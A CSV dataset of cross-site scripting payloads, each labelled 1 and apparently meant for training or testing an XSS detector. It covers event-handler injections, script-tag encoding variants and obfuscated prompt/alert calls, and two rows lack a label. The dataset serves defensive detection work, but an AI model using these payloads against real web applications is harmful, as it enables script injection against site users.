input,label
-prompt(8)-,1
'-prompt(8)-',1
";a=prompt,a()//
';a=prompt,a()//
'-eval(window['pro'%2B'mpt'](8)"")-'",1
"-eval(window['pro'%2B'mpt'](8)"")-""",1
onclick=prompt(8)>@x.y,1
onclick=prompt(8)><svg/onload=prompt(8)>@x.y,1
<image/src/onerror=prompt(8)>,1
<img/src/onerror=prompt(8)>,1
<image src/onerror=prompt(8)>,1
<img src/onerror=prompt(8)>,1
<image src =q onerror=prompt(8)>,1
<img src =q onerror=prompt(8)>,1
</scrip</script>t><img src =q onerror=prompt(8)>,1
"<script\x20type=""text/javascript"">javascript:alert(1);</script>",1
"<script\x3Etype=""text/javascript"">javascript:alert(1);</script>",1
"<script\x0Dtype=""text/javascript"">javascript:alert(1);</script>",1
"<script\x09type=""text/javascript"">javascript:alert(1);</script>",1
"<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>",1
"<script\x2Ftype=""text/javascript"">javascript:alert(1);</script>",1
"<script\x0Atype=""text/javascript"">javascript:alert(1);</script>",1
"'`""><\x3Cscript>javascript:alert(1)</script>        ",1
"'`""><\x00script>javascript:alert(1)</script>",1
"<img src=1 href=1 onerror=""javascript:alert(1)""></img>",1
"<audio src=1 href=1 onerror=""javascript:alert(1)""></audio>",1
"<video src=1 href=1 onerror=""javascript:alert(1)""></video>",1
"<body src=1 href=1 onerror=""javascript:alert(1)""></body>",1
"<image src=1 href=1 onerror=""javascript:alert(1)""></image>",1
"<object src=1 href=1 onerror=""javascript:alert(1)""></object>",1
"<script src=1 href=1 onerror=""javascript:alert(1)""></script>",1
"<svg onResize svg onResize=""javascript:javascript:alert(1)""></svg onResize>",1
"<title onPropertyChange title onPropertyChange=""javascript:javascript:alert(1)""></title onPropertyChange>",1
"<iframe onLoad iframe onLoad=""javascript:javascript:alert(1)""></iframe onLoad>",1
"<body onMouseEnter body onMouseEnter=""javascript:javascript:alert(1)""></body onMouseEnter>",1
"<body onFocus body onFocus=""javascript:javascript:alert(1)""></body onFocus>",1
"<frameset onScroll frameset onScroll=""javascript:javascript:alert(1)""></frameset onScroll>",1
"<script onReadyStateChange script onReadyStateChange=""javascript:javascript:alert(1)""></script onReadyStateChange>",1
"<html onMouseUp html onMouseUp=""javascript:javascript:alert(1)""></html onMouseUp>",1
"<body onPropertyChange body onPropertyChange=""javascript:javascript:alert(1)""></body onPropertyChange>",1
"<svg onLoad svg onLoad=""javascript:javascript:alert(1)""></svg onLoad>",1
"<body onPageHide body onPageHide=""javascript:javascript:alert(1)""></body onPageHide>",1
"<body onMouseOver body onMouseOver=""javascript:javascript:alert(1)""></body onMouseOver>",1
"<body onUnload body onUnload=""javascript:javascript:alert(1)""></body onUnload>",1
"<body onLoad body onLoad=""javascript:javascript:alert(1)""></body onLoad>",1
